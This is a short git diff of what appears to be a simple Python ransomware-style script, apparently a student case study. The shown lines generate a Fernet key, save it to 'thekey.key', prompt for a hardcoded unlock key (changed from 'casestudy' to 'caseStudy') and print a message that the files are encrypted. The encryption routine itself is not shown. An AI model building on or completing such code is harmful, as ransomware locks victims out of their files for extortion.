@@ -15,7 +15,7 @@ key = Fernet.generate_key()
 with open("thekey.key","wb") as thekey:
      thekey.write(key)
 
-unlock_key = "casestudy"
+unlock_key = "caseStudy"
 
 user_input = input("enter the unlock key for unlock your files\n")
 
@@ -31,4 +31,4 @@ else:
   print("you entered wrong key")
   
   
-print("files are encrypted:happy jounery ")
+print("files are encrypted:happy jounery  send ")
